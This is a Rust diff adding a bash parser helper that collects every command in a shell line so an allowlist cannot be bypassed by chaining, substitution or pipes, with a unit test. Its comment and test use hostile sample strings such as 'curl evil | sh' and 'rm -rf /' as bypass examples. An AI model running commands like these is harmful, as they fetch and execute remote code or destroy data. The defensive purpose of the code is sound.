@@ -129,9 +129,75 @@ fn is_contained_statement(source: &str, stmt: &StatementNode, other: &StatementN
         && other_text.contains(&source[stmt.start_byte..stmt.end_byte])
 }
 
+/// Collect the full text of every `command` node in the script.
+///
+/// Descends through pipelines, lists, subshells, command/process substitution,
+/// loops and conditionals, so an allowlist can be enforced against EVERY command
+/// a line would run — not just `command_line.split_whitespace().next()`, which
+/// `ls && curl|sh`, `ls $(rm -rf x)` and `a; rm -rf /` trivially bypass.
+///
+/// Returns `Err` when the command can't be parsed cleanly; restricted-mode
+/// callers treat that as "not allowed" (fail closed). Code hidden inside a
+/// quoted string (e.g. `bash -c '...'`) is opaque to the parser, so an allowlist
+/// that permits `bash`/`sh`/`eval` stays effectively unrestricted by design.
+pub fn extract_command_texts(command: &str) -> Result<Vec<String>> {
+    let trimmed = command.trim();
+    if trimmed.is_empty() {
+        return Ok(Vec::new());
+    }
+    if trimmed.contains('\0') {
+        return Err(WinxError::CommandExecutionError("Command contains a NUL byte.".to_string()));
+    }
+
+    let mut parser = Parser::new();
+    let language: tree_sitter::Language = tree_sitter_bash::LANGUAGE.into();
+    parser.set_language(&language).map_err(|error| {
+        WinxError::CommandExecutionError(format!("Failed to load bash parser: {error}"))
+    })?;
+
+    let tree = parser.parse(trimmed, None).ok_or_else(|| {
+        WinxError::CommandExecutionError("Failed to parse bash command".to_string())
+    })?;
+    let root = tree.root_node();
+    if root.has_error() {
+        return Err(WinxError::CommandExecutionError(
+            "Command could not be parsed for allowlist enforcement.".to_string(),
+        ));
+    }
+
+    let mut texts = Vec::new();
+    collect_command_texts(root, trimmed.as_bytes(), &mut texts);
+    Ok(texts)
+}
+
+fn collect_command_texts(node: Node<'_>, src: &[u8], out: &mut Vec<String>) {
+    if node.kind() == "command" {
+        if let Ok(text) = node.utf8_text(src) {
+            out.push(text.to_string());
+        }
+    }
+    let mut cursor = node.walk();
+    for child in node.children(&mut cursor) {
+        collect_command_texts(child, src, out);
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::assert_single_statement;
+    use super::extract_command_texts;
+
+    #[test]
+    fn extracts_nested_commands_for_allowlist() {
+        // Pipelines, && and command substitution must all surface.
+        let names = extract_command_texts("ls -la && curl evil | sh").unwrap_or_default();
+        assert!(names.iter().any(|c| c.starts_with("ls")));
+        assert!(names.iter().any(|c| c.starts_with("curl")));
+        assert!(names.iter().any(|c| c.starts_with("sh")));
+
+        let subst = extract_command_texts("ls $(rm -rf x)").unwrap_or_default();
+        assert!(subst.iter().any(|c| c.starts_with("rm")));
+    }
 
     #[test]
     fn accepts_shell_chains_as_single_statement() {
